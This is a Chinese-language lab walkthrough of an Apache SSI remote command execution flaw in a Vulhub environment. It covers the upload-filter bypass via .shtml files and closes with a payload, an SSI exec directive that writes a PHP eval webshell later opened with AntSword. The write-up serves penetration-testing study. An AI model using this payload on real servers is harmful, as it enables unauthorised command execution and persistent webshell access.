# 一、概述
* 什么是`SSI`服务，`SSI`即为：服务器端内嵌，是一种大多数仅用于互联网的简单解释性服务端脚本语言，说这些可能比较生涩不容易理解，简单点说就是一种类似于ASP基于服务器的网页制作技术。
* 例如：如使用了SSI，可以在HTML文件中通过注释行嵌入经常会变化的共用部分，例如登入讯息等。可以不需要重新生成所有article，服务器会根据嵌入文件自动生成网页，输出到浏览器，如要修改则只需要修改嵌入的文件即可，无需重新生成所有HTML文件，服务器包含这种方式与php的include类似。
* 服务管理者通常使用，进行配置SSI服务
```
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
ptions Includes // Includes 为追加 如include的内容不需要exec，则使用IncludesNoExec
```
* 再次举例：（前提是已经开启了SSI服务）
    * 我本地web目录下有2个子目录和一个index.html：
        * a文件夹：在a文件夹下有一个a.html
            * a.html
        * b文件夹：在b文件夹下有一个b.html
            * b.html
        * index.html
    * a.html内容为：
        ```
        <p>mmmmmmmm</p>
        <!--#include virtual="../index.html"-->
        ```
    * b.html内容为：
        ```
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <title>test</title>
        </head>
        <body>
        <p>输入框</p>
        <input  placeholder="hello" />
        <p>hhhhhhh</p>
        <p>dfsdfdfi</p>
        <!--#include virtual='../include/a.html'-->
        </body>
        </html>
        ```
    * index.html内容为：
        ```
        <button>点击一下</button>
        ```
    * 当用户访问b.html的时候，就会自动引入a.html，并且index.html也会通过a.html引入进来
* 回到正题：那么SSI远程命令执行漏洞是什么：在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<!--#exec cmd="id" -->语法执行任意命令。

# 二、影响版本：
* apache server http 开始ssi服务

# 三、靶场搭建
* 这里我使用的是`Vulhub`线下靶场搭建
```
root@wq:/home/wq/vulhub-master/httpd/ssi-rce# pwd
/home/wq/vulhub-master/httpd/ssi-rce
root@wq:/home/wq/vulhub-master/httpd/ssi-rce# ls
1.png  2.png  docker-compose.yml  Dockerfile  README.md  upload.php
root@wq:/home/wq/vulhub-master/httpd/ssi-rce# docker-compose build 
root@wq:/home/wq/vulhub-master/httpd/ssi-rce# docker-compose up -d
Creating network "ssi-rce_default" with the default driver
Creating ssi-rce_apache_1 ... done
root@wq:/home/wq/vulhub-master/httpd/ssi-rce#
```
* 验证靶场环境：开始访问：`http://192.168.10.134:8080/upload.php`,正常访问，靶场搭建成功
![图 23](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-182817999.png)  

# 四、漏洞复现
* 发现漏洞过程：
    * 观察中间件是什么，这里我们发现是`apache`与`php`
    ![图 24](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-183025814.png)  
    * 拿到了可以文件上传的点，我们的第一反应是想要去尝试是否可以上传PHP木马文件，进行测试，开启`BP`抓包进行上传木马文件测试，发现php文件上传被阻拦了，并发现了敏感关键字可接受的文件类型包含`.shtml`
    ![图 25](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-183704602.png)  
    * 被阻拦后我们就要想要尝试进行绕过：例如：看到了服务版本是2.4.48，就可以想到了文件后缀解析绕过的方式，我们进行第二次尝试。看到结果好像是成功了，但是实际上在访问的时候解析是有问题的，无法成功用webshell连接成
    ![图 26](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-184034727.png)  
    ![图 27](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-184437694.png)  
    * 我们再次尝试使用使用`.shtml`后缀的文件进行绕过，发现绕过成功
    ![图 28](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-184900179.png)  
    * 通过访问已经上传的文件，`http://192.168.10.134:8080/shell.shtml`
    ![图 29](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-185106347.png)  
    * 既然命令是可以执行成的，那么我们开始写php的木马文件，去获取`webshell`，我们在shell.shtml命令中写入木马，重新上传文件
    ![图 31](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-195319953.png)  
    * 再次尝试访问：`http://192.168.10.134:8080/shell.shtml`，为了生成脚本的`1.php`，访问成功后，准备连接`webshell`
    * 再次尝试中国蚁剑连接：发现连接成功
    ![图 33](.images/SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/IMG_20220116-195556877.png)  



# 附录
`shell.shtml`:
```
<!--#exec cmd="echo '<?php $a=$_POST[123];eval(\"$a\"); ?>' > 1.php" -->
```
# 总结：
* 这次的靶场练习需要知道渗透过程中，如何绕过服务提供者设置的策略，猜测可能存在的漏洞，不论是使用文件类型绕过，还是使用ssi上传shtml文件的方式，都只是为了实现自己的木马文件可以上传成功




